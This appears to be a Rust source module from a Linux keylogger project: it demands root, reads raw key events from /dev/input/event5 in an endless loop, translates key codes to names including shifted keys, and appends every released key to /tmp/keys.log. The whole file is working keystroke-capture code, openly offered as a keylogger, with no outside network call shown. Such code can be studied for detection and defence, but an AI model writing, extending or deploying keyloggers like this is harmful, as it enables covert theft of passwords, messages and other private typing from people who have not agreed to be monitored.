use std::{
    fs::{File, OpenOptions},
    io::{Read, Write},
    str, 
    mem,
};

use libc::input_event;

use crate::common::Common;
use super::input::{
    KEY_NAMES,
    SHIFT_KEY_NAMES,
    MAX_KEYS,
    UK,
    LEFTSHIFT,
    RIGHTSHIFT
};

const DEVICE_PATH: &str = "/dev/input/event5";
const DATA_PATH: &str = "/tmp/keys.log";

const EV_SIZE: usize = mem::size_of::<input_event>();
const EV_KEY: u16 = 1;

pub struct Keylogger { }

impl Common for Keylogger {
    fn find_keyboard(&self) -> bool {
        true
    }

    fn start_logging(&self) {
        if unsafe { libc::geteuid() } != 0 {
            panic!("Must run as root user");
        }

        let mut device_file = File::open(DEVICE_PATH).unwrap();
        let mut data_file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(DATA_PATH)
            .unwrap();

        let mut buf: [u8; EV_SIZE] = unsafe { mem::zeroed() };  

        loop {
            match device_file.read(&mut buf) {
                Ok(num) => {
                    if num != EV_SIZE {
                        continue;
                    }

                    let ev = unsafe { mem::transmute::<[u8; EV_SIZE], input_event>(buf) };
                    log_keystroke(ev, &mut data_file);
                },
                Err(e) => panic!("Could not read: {}", e)
            }
        }
    }
}

fn log_keystroke(ev: input_event, fd: &mut File ) -> bool {
    if ev.type_ == EV_KEY && ev.value == 0 {
        let code = ev.code as usize;

        let key = match ev.code {
            LEFTSHIFT | RIGHTSHIFT => SHIFT_KEY_NAMES[code],
            0..=MAX_KEYS => KEY_NAMES[code],
            _ => UK
        };

        return fd.write(key.as_bytes()).unwrap() == 1
    }

    false
}
